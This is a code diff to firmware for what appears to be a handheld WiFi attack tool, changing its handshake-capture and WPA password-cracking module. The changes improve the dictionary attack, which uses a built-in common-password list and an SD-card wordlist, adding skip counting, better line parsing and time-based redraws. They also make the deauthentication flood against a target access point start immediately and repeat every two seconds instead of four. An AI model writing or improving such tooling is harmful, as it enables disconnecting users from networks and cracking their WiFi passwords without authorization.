@@ -38,6 +38,7 @@ static const char* const kBuiltinPasswords[] = {
     "precious",    "einstein",    "napoleon",    "mountain",    "dolphins",
     "charlotte",   "fernando",    "basketball",  "barcelona",   "87654321",
     "paradise",    "motorola",    "brooklyn",    "stephanie",   "elizabeth",
+    "0123456789",
 };
 static constexpr int kBuiltinCount = sizeof(kBuiltinPasswords) / sizeof(kBuiltinPasswords[0]);
 
@@ -342,12 +343,14 @@ void HandshakeCapture::crack() {
     const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
     mbedtls_md_setup(&mdCtx, sha1, 1);  // 1 = HMAC mode
 
-    bool     useSD   = sdCardManager.isReady();
+    bool     useSD      = sdCardManager.isReady();
     File     wl;
-    uint32_t tried   = 0;
-    uint32_t t0      = millis();
-    char     found[64] = {0};
-    bool     done    = false;
+    uint32_t tried      = 0;
+    uint32_t skipped    = 0;
+    uint32_t t0         = millis();
+    uint32_t lastRedraw = 0;
+    char     found[64]  = {0};
+    bool     done       = false;
 
     auto redraw = [&](const char* current) {
         _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
@@ -360,8 +363,8 @@ void HandshakeCapture::crack() {
         uint32_t elapsed = (millis() - t0) / 1000;
         uint32_t rate = elapsed ? tried / elapsed : tried * 2;
         _dm.setCursor(10, _dm.getCursorY());
-        char stat[32];
-        snprintf(stat, sizeof(stat), "%-6u tried  %u/s", tried, rate);
+        char stat[40];
+        snprintf(stat, sizeof(stat), "%-5u tried  %-4u skip  %u/s", tried, skipped, rate);
         _dm.setTextColor(0x4208); _dm.println(stat);
 
         _dm.setCursor(10, _dm.getCursorY());
@@ -378,24 +381,30 @@ void HandshakeCapture::crack() {
             while (wl.available() && !done) {
                 int i = 0;
                 while (wl.available() && i < 63) {
-                    char c = wl.read();
-                    if (c == '\n' || c == '\r') break;
+                    char c = (char)wl.read();
+                    if (c == '\r') {
+                        if (wl.available() && wl.peek() == '\n') wl.read();
+                        break;
+                    }
+                    if (c == '\n') break;
                     line[i++] = c;
                 }
                 line[i] = '\0';
-                if (i < 8 || i > 63) continue;  // skip blanks and invalid-length lines
+                if (i < 8 || i > 63) { skipped++; continue; }
 
                 tried++;
+                uint32_t now = millis();
+                if (now - lastRedraw >= 300) {
+                    lastRedraw = now;
+                    redraw(line);
+                    char k = inputHandler.getKeyboardInput();
+                    if (k == 'q' || k == 'Q') { done = true; break; }
+                    vTaskDelay(1);
+                }
                 if (tryPassword(line, &mdCtx, sha1)) {
                     strncpy(found, line, sizeof(found) - 1);
                     done = true;
                     break;
-                }
-                if (tried % 20 == 0) {
-                    redraw(line);
-                    char k = inputHandler.getKeyboardInput();
-                    if (k == 'q' || k == 'Q') { done = true; break; }
-                    yield();
                 }
             }
             wl.close();
@@ -409,16 +418,18 @@ void HandshakeCapture::crack() {
         useSD = false;    // update source label
         for (int i = 0; i < kBuiltinCount && !done; i++) {
             tried++;
+            uint32_t now = millis();
+            if (now - lastRedraw >= 300) {
+                lastRedraw = now;
+                redraw(kBuiltinPasswords[i]);
+                char k = inputHandler.getKeyboardInput();
+                if (k == 'q' || k == 'Q') break;
+                vTaskDelay(1);
+            }
             if (tryPassword(kBuiltinPasswords[i], &mdCtx, sha1)) {
                 strncpy(found, kBuiltinPasswords[i], sizeof(found) - 1);
                 done = true;
                 break;
-            }
-            if (i % 20 == 0) {
-                redraw(kBuiltinPasswords[i]);
-                char k = inputHandler.getKeyboardInput();
-                if (k == 'q' || k == 'Q') break;
-                yield();
             }
         }
     }
@@ -450,8 +461,8 @@ void HandshakeCapture::crack() {
     uint32_t elapsed = (millis() - t0) / 1000;
     uint32_t rate    = elapsed ? tried / elapsed : tried * 2;
     _dm.setCursor(10, _dm.getCursorY());
-    char stat[40];
-    snprintf(stat, sizeof(stat), "%u tried in %us  (%u/s)", tried, elapsed, rate);
+    char stat[48];
+    snprintf(stat, sizeof(stat), "%u tried, %u skipped  %us (%u/s)", tried, skipped, elapsed, rate);
     _dm.setTextColor(0x4208); _dm.println(stat);
     _dm.setTextColor(TFT_WHITE);
     _dm.setCursor(10, _dm.getCursorY());
@@ -555,7 +566,7 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
     uint32_t eapolCount  = 0;
     uint32_t deauthCount = 0;
     bool     captured    = false;
-    uint32_t lastDeauth  = 0;
+    uint32_t lastDeauth  = millis() - 2001;  // fire first burst immediately
     uint32_t lastRefresh = 0;
 
     auto redrawStatus = [&]() {
@@ -657,7 +668,7 @@ void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) 
         }
 
         uint32_t now = millis();
-        if (now - lastDeauth >= 4000) {
+        if (now - lastDeauth >= 2000) {
             lastDeauth = now;
             _da.sendBroadcastBurst(bssid);
             deauthCount++;
